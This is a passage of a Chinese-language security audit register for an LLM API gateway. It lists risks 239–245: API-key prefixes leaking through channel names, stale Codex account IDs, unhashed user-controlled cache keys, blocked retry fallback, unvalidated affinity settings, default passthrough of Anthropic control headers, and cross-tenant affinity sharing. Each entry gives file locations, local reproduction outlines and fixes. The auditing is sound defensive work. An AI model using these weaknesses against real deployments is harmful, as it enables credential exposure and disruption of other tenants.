- 标题：`batch_add_set_key_prefix_2_name` 为 true 且批量新增多个 key 时，后端把每个 key 的前 8 位追加到 `channels.name`；渠道名称随后作为普通运营元数据返回和记录
- 影响范围：渠道密钥前缀、渠道列表/搜索、消费日志 `channel_name`、自动禁用/恢复通知、系统日志、上游模型同步摘要、后台排障材料、第三方通知接收端
- 触发条件：管理员脚本、旧前端或直接 API 在 batch 新增渠道时传入 `batch_add_set_key_prefix_2_name=true`；key 前缀本身可用于供应商凭证识别、客服对账、撞库筛选或和其他泄露片段拼接；后续渠道发生测试、自动禁用、自动恢复、日志查询或模型同步。
- 涉及文件/函数：
  - `router/api-router.go:233-247`：`POST /api/channel/` 只在渠道组的 `AdminAuth` 下，没有类似查看完整 key 的 `RootAuth + SecureVerificationRequired`。
  - `controller/channel.go:550-552`：新增渠道请求体接受 `batch_add_set_key_prefix_2_name`。
  - `controller/channel.go:665-670`：当批量 key 数量大于 1 且该字段为 true 时，直接取 `localChannel.Key[:8]` 拼进 `localChannel.Name`。
  - `web/default/src/features/channels/lib/channel-form.ts:111-114` 与 `web/default/src/features/channels/lib/channel-form.ts:434-440`：default 前端默认值为 false，但表单转换仍会在 batch 模式把该字段提交给后端；直接 API 不受 UI 是否显示开关限制。
  - `model/channel.go:356-365` 与 `model/channel.go:379-405`：渠道列表和搜索只 `Omit("key")`，不会隐藏 `name`；一旦 name 含 key 前缀，普通列表/搜索会返回该前缀。
  - `middleware/distributor.go:404-405`、`controller/relay.go:231`、`controller/channel-test.go:952-958`：运行时把 `channel.Name` 放入上下文、自动禁用/恢复和渠道测试错误处理。
  - `service/channel.go:19-41`：自动禁用和恢复会把渠道名称写入系统日志和 Root 通知标题/正文。
  - `model/log.go:447-456`：查询消费日志时按 `channel_id` 回填 `ChannelName`，把当前渠道名称暴露到日志列表。
- 可能后果：完整渠道 key 查看接口虽然需要 Root、限流、禁缓存和安全验证，但 key 前缀可以通过普通渠道列表、搜索、日志和通知长期可见；这削弱了“只有 step-up 后才能接触密钥信息”的边界。对于 OpenAI/Azure/Claude/Gemini/第三方代理等有固定前缀或账号特征的 key，前 8 位可能足以识别供应商账号、关联同一批凭证、辅助撞库或和其他日志片段拼接。更糟糕的是名称是持久运营字段，后续自动禁用、恢复、模型同步、客服截图、日志导出和通知转发都会继续传播，即使后来关闭完整 key 查看或轮换权限也无法自动清除历史名称。
- 复现思路：本地用管理员会话向 `/api/channel/` 提交 batch 新增，包含两个假 key，并设置 `batch_add_set_key_prefix_2_name=true`；确认新建渠道名称追加了各自前 8 位。随后调用渠道列表、搜索和日志查询，或触发一次本地假上游错误导致自动禁用，观察列表、`ChannelName`、系统日志/通知正文是否都出现该前缀。该复现只使用本地假 key 和假上游，不访问真实 provider。
- 修复建议：不要把真实 key 的任意前缀写入 `channels.name`。如需区分批量导入结果，使用不可逆短 fingerprint，例如 `sha256(key)[:8]`，并明确标注为 fingerprint，不可和真实前缀混淆；更推荐生成序号或导入批次号。后端应拒绝或废弃 `batch_add_set_key_prefix_2_name`，或将其提升到 Root 二次确认并仅允许 fingerprint。历史数据应提供一次性迁移/清理脚本，扫描形如真实 key 前缀的渠道名称并提示运营改名。日志、通知和导出中应把渠道名称视为可能含敏感片段，至少支持脱敏展示和最小权限访问。
- 优先级：P2
- 当前状态：已确认后端会把 key 前 8 位持久化进渠道名称，且渠道名称会进入列表、搜索、日志补齐和自动禁用/恢复通知；尚未修复。

### 风险 239：Codex key 只校验 account_id 存在不校验与 access token 匹配，refresh 后可能保留旧账号标识并让 usage/relay 持续错绑

- 标题：Codex 渠道 key JSON 中 `access_token` 与 `account_id` 没有一致性校验；手工编辑只要求两者非空，refresh 也只在 `account_id` 为空时才从新 access token 提取，导致旧 account_id 可继续作为 `chatgpt-account-id` 请求头使用
- 影响范围：Codex 渠道真实 relay、Codex usage 查询、OAuth refresh、渠道凭证轮换、上游账号成本归属、自动刷新任务、后台账号展示、供应商账号限流/封禁排查
- 触发条件：管理员手工粘贴 Codex JSON 时把 access token 和 account_id 混用；复制渠道或脚本替换 access/refresh token 但保留旧 account_id；OAuth refresh 返回的新 token 属于不同账号或本地 key 曾经被部分编辑；直接 API 绕过前端生成流程；历史数据已经存在 stale account_id。
- 涉及文件/函数：
  - `controller/channel.go:493-510`：Codex 新增/更新校验只要求 key 是 JSON 且包含非空 `access_token`、`account_id`，没有从 JWT claim 中提取 account id 并比较。
  - `service/codex_oauth.go:255-280`：项目已有 `ExtractCodexAccountIDFromJWT` 能从 access token 的 `chatgpt_account_id` claim 提取账号 ID，这是可复用的校验能力。
  - `controller/codex_oauth.go:188-204`：OAuth 生成路径会从 token 提取 account_id 并写入 key JSON，这是正向路径；问题集中在手工编辑、脚本写入和 refresh 后的旧字段保留。
  - `service/codex_credential_refresh.go:70-82`：refresh 更新 access/refresh token 后，只有 `oauthKey.AccountID` 为空才从新 access token 补齐；非空旧 account_id 不会被校验或覆盖。
  - `controller/codex_usage.go:45-60` 与 `controller/codex_usage.go:71-72`：usage 查询读取 key JSON 中的 `account_id` 并传给上游，不验证它是否属于当前 access token。
  - `service/codex_wham_usage.go:34-42`：usage 请求把 `Authorization: Bearer <access_token>` 和 `chatgpt-account-id: <account_id>` 一起发送。
  - `relay/channel/codex/adaptor.go:156-172`：真实 Codex relay 同样解析 key JSON，并把 `account_id` 直接写入 `chatgpt-account-id` 请求头。
  - `web/default/src/features/channels/components/dialogs/codex-usage-dialog.tsx:468-486`：usage 弹窗展示上游返回的 user/email/account_id，但这只是查询结果展示，不会反向校正渠道 key。
- 可能后果：渠道看起来有非空 access token、refresh token 和 account_id，后台保存成功，自动刷新也成功更新 token；但真实 usage 和用户请求仍带着旧账号 ID，可能持续返回 401/403、错误 usage、错误限流状态或把请求打到非预期账号上下文。运营会看到“凭证刚刷新、expires_at 也更新，但 Codex 请求仍失败/限流”的矛盾状态。若 access token 与 account_id 分属两个上游账号，供应商侧成本、限流和封禁排查都会错位：NewAPI 记录的是渠道 A，OAuth email/account 展示可能来自 B，`chatgpt-account-id` 请求头却仍是旧 C。该问题不直接给用户充值或扣费，但会影响高成本 Codex 渠道的可用性、成本归属和事故定位。
- 复现思路：本地构造两个 mock Codex JWT，分别含不同 `chatgpt_account_id`；保存一个 Codex 渠道 key，使用 token A 但 account_id B，确认 `validateChannel` 接受。随后调用 usage 或真实 relay 的本地 mock endpoint，检查请求头中 Authorization 来自 A、`chatgpt-account-id` 来自 B。再把 refresh mock 配成返回 token C，观察 `service.RefreshCodexChannelCredential` 在旧 account_id 非空时是否仍保留 B。不要对真实 Codex/OAuth 账号做错绑测试。
- 修复建议：Codex key 写入和刷新必须把 account_id 作为派生字段，而不是管理员可自由填写的事实字段。保存时从 access token 提取 `chatgpt_account_id`，如果提取失败或与提交的 `account_id` 不一致则拒绝或覆盖为 token 内 claim；refresh 后无论旧值是否为空，都应重新提取并更新 account_id/email，并在审计中记录旧/新账号。对于无法解析的历史 token，应标记 `credential_identity_unverified`，禁止自动刷新或真实 relay，要求重新 OAuth 授权。usage 查询可展示上游返回的 account/email，但不应把它当成 key 一致性的唯一证据；一致性校验应发生在保存/refresh 阶段。
- 优先级：P2
- 当前状态：已确认保存只校验字段存在，refresh 不覆盖非空旧 account_id，usage 和真实 relay 都直接使用 key JSON 中的 account_id；尚未修复。

### 风险 240：默认 Codex channel affinity 把用户可控 `prompt_cache_key` 原文拼入 Redis/内存缓存键，缺少长度、格式和基数约束

- 标题：`channel_affinity_setting` 默认开启 Codex CLI trace 规则，直接从请求体 `prompt_cache_key` 取值并拼进 affinity cache key；该值没有长度上限、字符集规范、哈希化或按用户/令牌限流，高基数或超长值会扩散到 Redis key、内存 LRU key、统计枚举和错误日志
- 影响范围：Codex `/v1/responses` relay、channel affinity 命中率、Redis key 空间、进程内 hot cache、affinity 统计页/清理入口、系统错误日志、trace/session 标识隐私、上游渠道粘性和重试策略
- 触发条件：普通 API 用户提交大量不同 `prompt_cache_key`；客户端把 session、prompt、租户、邮箱或长随机串写入 `prompt_cache_key`；攻击者构造含换行/冒号/超长 JSON 的 affinity 值；Redis 开启且默认 `MaxEntries=100000`、`DefaultTTLSeconds=3600`；运营查看 affinity stats 或遇到 cache get/set 失败。
- 涉及文件/函数：
  - `setting/operation_setting/channel_affinity_setting.go:76-96`：默认 `channelAffinitySetting.Enabled=true`，Codex 规则匹配 `^gpt-.*$` 和 `/v1/responses`，`KeySources` 直接取 `gjson prompt_cache_key`，且 `ValueRegex` 为空、TTL 使用默认 3600 秒。
  - `setting/operation_setting/channel_affinity_setting.go:38-44`：默认模板还会透传 `Originator`、`Session_id`、`User-Agent`、`X-Codex-Beta-Features`、`X-Codex-Turn-Metadata`；这些 header 透传本身是功能设计，但会强化用户 trace 与 affinity 绑定的隐私敏感性。
  - `service/channel_affinity.go:289-331`：`extractChannelAffinityValue` 对 gjson string/number/bool 直接 `String()`，对象或数组返回 `Raw`；只 `TrimSpace`，没有长度、字符集、标量类型或敏感字段校验。
  - `service/channel_affinity.go:337-349`：`buildChannelAffinityCacheKeySuffix` 把 rule、model/group 和 `affinityValue` 用冒号拼接，未哈希化用户值。
  - `service/channel_affinity.go:590-610`：匹配规则后把完整 `cacheKeyFull`、`KeyHint`、`KeyFingerprint` 写入 gin context；`KeyHint` 虽会截断，但 `CacheKey` 仍包含原文。
  - `service/channel_affinity.go:612-615` 与 `service/channel_affinity.go:681-706`：读取和写入 HybridCache 时遇到错误会把完整 key 写入 `SysError`，因此超长或带业务标识的 `prompt_cache_key` 可进入系统日志。
  - `pkg/cachex/namespace.go:17-29` 与 `pkg/cachex/hybrid_cache.go:80-128`：HybridCache 对 raw key 加 namespace；如果传入已带 namespace 的 key 会幂等处理，这是读写键一致性的正向证据，但也意味着原始用户值会成为最终 Redis/内存 key 的一部分。
  - `service/channel_affinity.go:111-195`、`service/channel_affinity.go:198-213`：统计和清理会枚举全部 affinity keys；高基数键会增加 stats/clear 操作成本，并且 `strings.Split(rest, ":")` 会被用户值中的冒号干扰统计归类。
  - `service/channel_affinity_template_test.go:239-306` 与 `relay/channel/api_request_test.go:160-187`：测试确认 Codex 模板会按请求 header 透传 runtime headers；也确认缺失的 `x-codex-*` header 不会凭空生成，这是 header 透传边界的正向证据。
- 可能后果：大量不同 `prompt_cache_key` 可在一小时窗口内制造大量 affinity key，Redis 开启时没有本地 LRU 上限保护，可能导致 Redis key 空间、内存和扫描耗时膨胀；Redis 关闭时单进程 LRU 有 `MaxEntries=100000` 上限，但仍会被低价值随机 key 挤掉真实 CLI trace 粘性，导致渠道选择频繁抖动、`SkipRetryOnFailure` 的粘性语义失效。若客户端把会话 ID、租户 ID、邮箱、prompt 摘要或上游 trace 写入 `prompt_cache_key`，这些原文会出现在 Redis key 和 cache 错误日志中；如果值内含冒号或 JSON 对象，统计按 rule/model/group 拆分也会出现 unknown 或误归类，影响运营判断。该问题不直接构成充值漏洞，但会放大高成本 Codex 渠道的可用性、成本归因、隐私和排障风险。
- 复现思路：本地启用 Codex affinity，构造 `/v1/responses` 请求体 `{ "prompt_cache_key": "tenant@example.com:" + long_random }` 并让请求成功到 `RecordChannelAffinity`；检查 Redis `new-api:channel_affinity:v1:*` 或内存 `Keys()` 是否出现原始邮箱/长随机串。批量发送 10k 个不同 key 后查看 affinity stats/clear 耗时和真实稳定 key 是否被 LRU 挤出。测试仅在本地/测试 Redis 执行，不使用生产请求或真实上游。
- 修复建议：把 affinity 值作为敏感标识处理：缓存键只使用 `sha256(rule|model|group|affinityValue)` 或短 fingerprint，原文仅在内存 meta 中保留截断 hint；默认规则增加最大长度、允许字符集和标量类型限制，拒绝对象/数组和超长值；按 user/token/IP 对新建 affinity key 做速率限制或采样，Redis 模式也要设置全局容量/淘汰策略和每规则 key 数告警。错误日志只记录 rule、model/group、fingerprint、长度和 request id，不记录完整 key。统计解析不要依赖用户值中没有冒号，应使用结构化 key 或固定字段编码。前端/文档说明 `prompt_cache_key` 不能承载 PII 或密钥类信息。
- 优先级：P2
- 当前状态：已确认默认 Codex affinity 规则会直接使用用户可控 `prompt_cache_key` 构造缓存键；HybridCache namespace 处理是幂等的，未发现读写键不一致，但原文键扩散和高基数问题仍存在。

### 风险 241：默认 Codex affinity 的 `SkipRetryOnFailure=true` 在规则匹配后即阻断重试，新 key 和坏渠道都会绕过正常 fallback

- 标题：Codex 默认 affinity 规则匹配到 `prompt_cache_key` 后就把 `SkipRetryOnFailure` 写入请求上下文；普通 relay 和任务 relay 的重试决策优先读取该标记并直接停止重试，导致首次新 key、缓存命中坏渠道或命中已禁用渠道时都不会尝试其他可用渠道
- 影响范围：Codex `/v1/responses` 可用性、自动禁用后的恢复体验、auto group/cross-channel retry、高成本请求成功率、渠道故障隔离、客户侧错误率、Root 通知和运营排障
- 触发条件：默认 `channel_affinity_setting` 启用；用户请求体包含 `prompt_cache_key`；被选中或缓存命中的 Codex 渠道返回 429/5xx/可重试错误、网络超时、被自动禁用，或该 channel id 仍在 affinity TTL 内；系统还有其他同 model/group 的可用渠道。
- 涉及文件/函数：
  - `setting/operation_setting/channel_affinity_setting.go:76-96`：默认 Codex 规则 `Enabled=true`、`KeySources=prompt_cache_key`、`SkipRetryOnFailure=true`、TTL 默认 3600 秒。
  - `service/channel_affinity.go:550-621`：只要规则匹配并提取到 affinity value，就调用 `setChannelAffinityContext` 保存 meta；即使缓存 miss 返回 `found=false`，上下文里仍保留 `SkipRetry=true`。
  - `middleware/distributor.go:104-130`：缓存命中 preferred channel 后，如果该渠道已 disabled 且规则要求 skip retry，会直接返回 “渠道亲和性命中的渠道已被禁用”，不会进入普通随机选渠；如果渠道仍 enabled，则 `MarkChannelAffinityUsed` 明确设置 skip retry 标记。
  - `middleware/distributor.go:132-164`：缓存 miss 时仍会按普通逻辑选一个随机渠道；请求成功后才 `RecordChannelAffinity`，但前面留下的 affinity meta 会影响后续失败重试。
  - `service/channel_affinity.go:626-642`：`ShouldSkipRetryAfterChannelAffinityFailure` 在没有显式 flag 时回退读取 meta 的 `SkipRetry`，所以新 key 的缓存 miss 请求也会被识别为 skip retry。
  - `controller/relay.go:190-235` 与 `controller/relay.go:324-330`：普通 relay 失败后先执行 `processChannelError`，随后 `shouldRetry` 第一优先级检查 affinity skip retry，直接返回 false。
  - `controller/relay.go:613-619`：任务 relay 的重试决策也同样优先被 affinity skip retry 阻断。
  - `service/channel.go:45-64` 与 `service/channel.go:18-33`：可重试错误仍可能触发自动禁用和 Root 通知，但本次请求不会继续尝试备用渠道。
  - `service/channel_affinity_template_test.go:119-176`：测试确认 `ShouldSkipRetryAfterChannelAffinityFailure` 会在没有显式 flag 时使用 meta 的 `SkipRetry=true`，这是当前行为的直接单元证据。
- 可能后果：运营配置多个 Codex 渠道作为冗余，但只要客户端携带 `prompt_cache_key`，一次普通 429/5xx 或网络错误就会停在当前渠道，不再切到备用渠道；用户看到失败，平台仍可能把该渠道自动禁用并通知 Root。更隐蔽的是，某个 prompt/session 成功写入 affinity cache 后，如果对应渠道后续欠费、限流或自动禁用，同一个 `prompt_cache_key` 在 TTL 内会直接 403 或持续命中坏渠道，直到缓存过期或人工清理；这会让“只有部分会话/租户失败”的事故很难定位。缓存 miss 的首次请求也被阻断重试，说明这不是单纯的“已建立粘性后保护 prompt cache”的策略，而是默认规则匹配就降低了高成本 Codex 请求的可用性。它不直接造成充值套利，但会造成错误率升高、自动禁用噪声、用户侧重试放大和渠道冗余失效。
- 复现思路：本地准备两个同 group/model 的 Codex 假渠道，A 返回 500/429，B 返回成功；构造 `/v1/responses` 请求体带唯一 `prompt_cache_key`，让首次随机选到 A，观察 `shouldRetry` 因 affinity meta 返回 false，不会切到 B。再让一次成功把 key 记录到 A，随后把 A 改成 auto-disabled，重复同一 key，观察 distributor 直接返回 affinity channel disabled。复现只使用本地假上游和测试渠道，不对生产 provider 做故障注入。
- 修复建议：把 `SkipRetryOnFailure` 的适用范围收窄到“缓存命中且命中渠道仍 enabled 且本次错误属于明确不可跨渠道重试”的场景；缓存 miss 首次请求不应因为规则匹配就关闭 fallback。已禁用渠道命中时应优先清理该 affinity key 或降级为普通选渠，并记录一次 `affinity_stale_channel` 指标，而不是直接拒绝用户。可以增加规则字段区分 `skip_retry_on_cache_hit`、`skip_retry_on_first_assignment`、`fallback_when_disabled`，默认 Codex 规则建议允许 429/5xx/连接错误切换备用渠道，只对可能重复产生上游副作用的错误禁用重试。自动禁用时应同步删除指向该 channel id 的 affinity key，或在选择时检测 disabled 后删除并 fallback。
- 优先级：P2
- 当前状态：已确认默认 Codex affinity 规则的 skip retry 标记会在规则匹配后进入上下文，普通 relay 和任务 relay 都会优先停止重试；尚未修复。

### 风险 243：channel affinity 设置缺少服务端原子校验，非法规则或数值会先入库并静默保留旧运行态

- 标题：`channel_affinity_setting.*` 通过通用 `PUT /api/option/` 逐项保存；后端没有对 rules JSON、regex、TTL、MaxEntries、KeySources、ParamOverrideTemplate 做语义校验，配置管理器解析失败只跳过字段不返回错误，导致 DB/OptionMap/运行时结构体可能分叉
- 影响范围：Codex/Claude channel affinity 全站路由、runtime headers override、skip retry、缓存容量和 TTL、Redis/内存 key 空间、Root 配置变更可信度、多实例配置同步、事故修复回滚
- 触发条件：Root 在 JSON 模式手工编辑规则；前端或脚本提交非法 JSON、错误字段类型、非法 regex、负数/极大 `max_entries/default_ttl_seconds/ttl_seconds`、空 rule name、未包含 `include_rule_name` 的规则；保存多个字段时某一项失败或运行态解析跳过；多实例定时从 DB 同步配置。
- 涉及文件/函数：
  - `router/api-router.go:189-196`：`/api/option` 整组使用 `RootAuth`，cache stats 和 clear 也是 Root 级，这是权限正向证据；但没有针对 affinity 设置额外的 step-up、批量事务或专用校验入口。
  - `controller/option.go:120-152`：`UpdateOption` 把请求 value 转成字符串；后续 switch 中没有 `channel_affinity_setting.*` 分支。
  - `controller/option.go:226-343`：已有部分高风险配置会做后端预检，例如 `GroupRatio`、`ModelRequestRateLimitGroup`、自动禁用/重试状态码和 console JSON；channel affinity 未享受同等级预检。
  - `controller/option.go:344-352` 与 `model/option.go:210-223`：保存时先写 DB，再调用 `updateOptionMap`；`UpdateOption` 不检查 `DB.Save` 的错误，且通用接口单次只保存一个 key。
  - `model/option.go:259-267` 与 `model/option.go:595-609`：`updateOptionMap` 先写 `common.OptionMap[key]=value`，随后对已注册 config 调 `config.UpdateConfigFromMap`；该调用返回值被忽略。
  - `setting/config/config.go:203-269`：bool/int/float/JSON 解析失败时 `continue`，不返回错误；slice/struct JSON 解析失败也只跳过字段，旧运行态值继续保留。
  - `web/default/src/features/system-settings/general/channel-affinity/index.tsx:199-215`：JSON 模式只校验顶层是数组，不校验 rule 字段类型、regex、TTL、KeySources 或 override 模板语义。
  - `web/default/src/features/system-settings/general/channel-affinity/index.tsx:217-273`：前端把 enabled、switch、max_entries、default_ttl、rules 组装成多个 update 请求并逐个 `mutateAsync`；没有一次性后端事务或整体 rollback。
  - `web/default/src/features/system-settings/general/channel-affinity/index.tsx:374-388`：Max Entries 和 Default TTL 只用前端 `min=0`，直接 `Number(e.target.value)`；脚本/API 仍可提交负数、极大值或非数字字符串。
  - `service/channel_affinity.go:248-269`：运行时 regex 编译失败只 `continue`，不会在保存阶段阻止非法规则；错误 regex 会让规则静默不匹配。
  - `setting/operation_setting/channel_affinity_setting.go:76-112`：默认规则影响 Codex/Claude headers、skip retry 和缓存策略，说明 affinity 设置不是普通展示配置，而是生产路由控制面。
- 可能后果：Root 以为已经关闭/修复某条高风险 affinity 规则，但如果 rules JSON 或字段类型非法，数据库和前端 OptionMap 可显示新值，运行态结构体却静默保留旧规则；例如 enabled 已先保存为 true，rules 保存为非法 JSON 后运行态仍使用旧 Codex pass_headers/skip_retry 规则。反过来，脚本写入负数或极大 TTL/MaxEntries 可能让内存 LRU 容量、Redis TTL、stats TTL 和清理成本不可预测；非法 regex 不会报错，只会让规则失效，运营难以区分“没有请求匹配”还是“规则写坏”。多实例环境下，实例 A 保存后的运行态可能是旧规则，实例 B 定时同步时也会读取同一非法 DB 值并跳过更新，形成持久漂移。该问题不直接充值入账，但会让前几轮识别的 header 透传、skip retry、高基数缓存等风险在事故修复时无法可靠关闭或回滚。
- 复现思路：本地用 Root 调用 `PUT /api/option/` 先设置 `channel_affinity_setting.enabled=true`，再提交 `channel_affinity_setting.rules` 为非法 JSON 或字段类型错误，例如 `{"bad":true}`、`[{"name":"bad","model_regex":"("}]` 或 `ttl_seconds:"not-number"`；观察接口仍返回 success、DB/OptionMap 中保存新字符串，但 `operation_setting.GetChannelAffinitySetting().Rules` 仍保留旧值或静默规则不匹配。再重启/同步其它实例，确认 DB 中非法值会持续影响加载结果。只在本地测试库执行，不修改生产配置。
- 修复建议：为 `channel_affinity_setting` 建立专用保存接口或在 `UpdateOption` 中增加严格校验：一次性接收完整配置，解析到临时 `ChannelAffinitySetting`，校验 bool/int 正数范围、规则数量、rule name 唯一性、regex 可编译、KeySource 合法且必填、TTL/MaxEntries 上限、ParamOverrideTemplate 只允许安全操作，全部通过后用事务批量写 DB，再原子替换运行态。`config.UpdateConfigFromMap` 应返回解析错误，调用方不得忽略；DB 写和运行态更新失败任一发生都应返回失败并保留旧配置。高风险变更应记录 Root id、IP、旧/新规则摘要、diff、原因和 request id；保存成功后可选择自动清理受影响规则缓存并广播多实例同步。前端 JSON 模式也应调用后端 dry-run validate，而不是只校验顶层数组。
- 优先级：P2
- 当前状态：已确认 affinity 设置走通用单项保存，后端无专用校验，配置解析失败静默跳过并保留旧运行态；尚未修复。

### 风险 244：默认 Claude affinity 模板会透传用户请求中的 Anthropic 控制头，`Dangerous-Direct-Browser-Access` 等高影响 header 可在无需渠道单独配置时到达上游

- 标题：`claude cli trace` 默认规则的 `ParamOverrideTemplate` 把 `Anthropic-Beta`、`Anthropic-Version`、`Anthropic-Dangerous-Direct-Browser-Access`、`X-App` 和多种 `X-Stainless-*` header 纳入 `pass_headers`；只要请求匹配模型、路径和 `metadata.user_id`，这些用户请求头就会进入运行时 header override 并最终覆盖到上游请求
- 影响范围：Claude `/v1/messages` relay、Anthropic beta/版本/危险浏览器访问控制头、上游安全策略、渠道可用性、供应商风控、成本和功能开关、客户自带 CLI trace、Root 对渠道 header override 的理解
- 触发条件：默认 channel affinity 启用；用户请求 Claude 模型、路径为 `/v1/messages`，请求体带 `metadata.user_id`；用户或客户端设置 `Anthropic-Dangerous-Direct-Browser-Access`、`Anthropic-Beta`、`Anthropic-Version`、`X-App` 或 `X-Stainless-*` header；目标渠道没有显式覆盖这些 header，或渠道配置依赖默认 affinity 模板。
- 涉及文件/函数：
  - `setting/operation_setting/channel_affinity_setting.go:46-60`：默认 Claude CLI header allowlist 包含 `Anthropic-Beta`、`Anthropic-Dangerous-Direct-Browser-Access`、`Anthropic-Version`、`User-Agent`、`X-App` 和多种 `X-Stainless-*`。
  - `setting/operation_setting/channel_affinity_setting.go:97-110`：默认 `claude cli trace` 规则匹配 `^claude-.*$`、`/v1/messages`，从 `metadata.user_id` 提取 affinity key，未限制 User-Agent，模板为 `buildPassHeaderTemplate(claudeCliPassThroughHeaders)`。
  - `setting/operation_setting/channel_affinity_setting.go:62-73`：`buildPassHeaderTemplate` 生成 `mode=pass_headers` 且 `keep_origin=true` 的 operations。
  - `service/channel_affinity.go:448-474`：模板与渠道 Param Override 合并时，模板 operations 被插到渠道自有 operations 前；渠道自有 operations 后续仍可覆盖，这是正向边界。
  - `relay/common/override.go:941-958`：`pass_headers` 会逐个从请求 headers/context 复制到 header override；缺失的 header 会忽略。
  - `relay/common/override.go:1073-1099`：`keep_origin=true` 时不会覆盖已有 header override；如果渠道没有预设这些 header，用户请求值会被写入 runtime header override。
  - `relay/common/override.go:1529-1542` 与 `relay/common/override.go:431-438`：一旦 header override context 存在，就设置 `RuntimeHeadersOverride`，后续 `GetEffectiveHeaderOverride` 使用 runtime header map 作为最终结果。
  - `relay/channel/api_request.go:313-329`：上游请求先执行 adaptor 的默认 header setup，再应用 header override；因此 runtime headers 可以覆盖 adaptor 设置的 `anthropic-version/anthropic-beta` 等头。
  - `relay/channel/claude/adaptor.go:73-90`：Claude adaptor 本身已经会从用户请求读取 `anthropic-beta` 和 `anthropic-version`，这是既有行为；本轮新增关注 affinity 模板额外默认透传 `Anthropic-Dangerous-Direct-Browser-Access`、`X-App`、`X-Stainless-*` 等更大的 header 集合。
  - `relay/common/override_test.go:1870-1903` 与 `relay/common/override_test.go:1970-1999`：测试确认 `pass_headers` 会写入 runtime header override，且 runtime override 是最终 header map；也确认渠道自有 header 可被保留。
- 可能后果：普通用户或第三方客户端可在符合 affinity 条件时把 Anthropic 供应商控制头带到上游，启用或请求平台未显式评估的 beta/浏览器访问相关行为，造成上游 4xx/风控、功能开关漂移、成本能力变化或供应商侧事故归因困难。由于默认规则没有 `UserAgentInclude`，并不只限官方 Claude CLI；任何脚本只要提交 `metadata.user_id` 就可能触发该 header 模板。运营查看渠道配置时可能以为没有配置这些 header override，但 affinity 模板会在运行时注入，只有日志里的 `admin_info.channel_affinity.override_template` 显示一个键数量，不能直观看到具体 header 名称和值。该问题和风险 153 的“自定义 Param Override 可复制敏感 header”不同，本轮聚焦的是默认内置模板把高影响 provider header 放入默认透传集合。
- 复现思路：本地配置 Claude 假渠道，发送 `/v1/messages` 请求，model 为 `claude-*`，body 含 `metadata.user_id`，请求头带 `Anthropic-Dangerous-Direct-Browser-Access: true` 和自定义 `X-App`；让请求命中 affinity 模板后抓取本地假上游收到的 headers，确认这些 header 被转发。再在渠道 Header Override 里预设同名 header，验证 `keep_origin=true` 时渠道值优先。复现只使用本地假上游，不向真实 Anthropic/Claude provider 发送危险 header。
- 修复建议：默认 Claude affinity 模板应收窄 header allowlist，只保留确实必要且低风险的 trace header；`Anthropic-Beta`、`Anthropic-Version`、`Anthropic-Dangerous-Direct-Browser-Access` 这类 provider 控制头应默认禁止透传，改为渠道级显式 allowlist，并要求 Root 配置确认。规则可增加 `UserAgentInclude` 限定官方 CLI，或要求 token/user/group 维度白名单。运行时日志应记录模板实际透传的 header 名称摘要和值是否来自用户请求，不记录敏感值；后台 UI 应在 affinity 规则中标出“会覆盖/影响上游 provider 控制头”的风险。对 adaptor 已直接透传的 `anthropic-beta/version` 也应统一纳入同一个 provider header policy，避免 template 与 adaptor 双路径语义不一致。
- 优先级：P2
- 当前状态：已确认默认 Claude affinity 模板包含高影响 Anthropic headers，且 runtime header override 会在 adaptor header setup 后应用；尚未修复。

### 风险 245：affinity cache key 不包含 NewAPI user/token 维度，不同用户复用同一 `prompt_cache_key`/`metadata.user_id` 会共享渠道粘性和故障后果

- 标题：默认 Codex/Claude affinity 只把 rule、using group 和用户提供的 affinity value 拼入缓存键；NewAPI 的 user id、token id、token group、真实上游账号/渠道凭证 fingerprint 都不参与隔离，跨用户同值会命中同一 preferred channel
- 影响范围：多租户 Codex/Claude relay、渠道粘性、供应商账号风控、上游 trace/session 归因、自动禁用后的局部故障、skip retry、客户之间的性能/缓存收益隔离、客服排障
- 触发条件：多个用户在同一 `using_group` 下使用相同 `prompt_cache_key`、`metadata.user_id`、固定 CLI 默认值、低熵租户名或可猜测会话名；某个用户先成功写入 affinity cache；其他用户随后使用同值发起请求；对应渠道后续限流、欠费、自动禁用或供应商账号被风控。
- 涉及文件/函数：
  - `setting/operation_setting/channel_affinity_setting.go:81-95`：默认 Codex 规则以请求体 `prompt_cache_key` 作为 key source，只包含 using group 和 rule name，不包含 NewAPI user/token。
  - `setting/operation_setting/channel_affinity_setting.go:97-110`：默认 Claude 规则以 `metadata.user_id` 作为 key source，同样只包含 using group 和 rule name。
  - `service/channel_affinity.go:337-349`：`buildChannelAffinityCacheKeySuffix` 仅按 `rule.Name`、可选 model、`usingGroup` 和 `affinityValue` 拼接；没有读取 gin context 中的 user id 或 token id。
  - `service/channel_affinity.go:590-610`：写入 meta 时记录 rule、key hint/fingerprint、using group、model 和 request path；没有记录当前 NewAPI user id、token id 或渠道凭证 fingerprint。
  - `constant/context_key.go:16`、`constant/context_key.go:46`、`constant/context_key.go:52` 与 `middleware/auth.go:270`、`middleware/auth.go:399`、`middleware/auth.go:414`：请求上下文里实际已有 `token_id`、用户 id 和 using group，可用于隔离或日志，但 affinity key 构造未使用它们。
  - `middleware/distributor.go:104-130`：preferred channel 命中后会直接使用缓存中的 channel id；若该渠道 disabled 且 skip retry，则直接拒绝，而不是按当前用户重新选渠。
  - `service/channel_affinity.go:681-706`：成功后 `RecordChannelAffinity` 只按当前 context 中的 cache key 写入 channel id，没有区分是哪个用户/token 建立了该粘性。
  - `service/log_info_generate.go:155`：日志会从请求头提取 `user_id/session_id` 等客户端标识，这是观测层证据；但这些标识不等同于 NewAPI 的身份隔离，也没有进入 affinity cache key。
- 可能后果：用户 A 使用 `prompt_cache_key=default` 或 `metadata.user_id=team-1` 成功后，用户 B 只要在同一 group 使用相同值，就会被路由到 A 写入的 preferred channel。若渠道背后是某个特定供应商账号、区域或 OAuth 凭证，B 的流量会跟随 A 的历史粘性，可能共享同一供应商风控/限流/欠费后果；当该渠道自动禁用时，B 也会在 TTL 内直接遇到 affinity disabled 或 skip retry，形成“不同客户相同 key 一起故障”的局部事故。即使没有数据越权，运营也会把多个租户的上游缓存收益、失败率和渠道账号归因混在一起。低熵或默认 key 还会放大风险：攻击者可故意使用常见 key 污染某 group 的 affinity，先把同值写到低质量渠道，再让其他使用同值的请求继承它。
- 复现思路：本地创建两个不同用户/Token，置于同一 group，准备两个同模型渠道 A/B。用户 A 用 `prompt_cache_key=same-key` 请求并成功写入 A；随后用户 B 用同一 `prompt_cache_key` 请求，观察 distributor 命中 A 而不是为 B 独立选渠。再把 A 改成 auto-disabled，用户 B 重复同 key，观察是否收到 affinity disabled 或停止 fallback。复现只用本地假渠道，不使用真实上游账号。
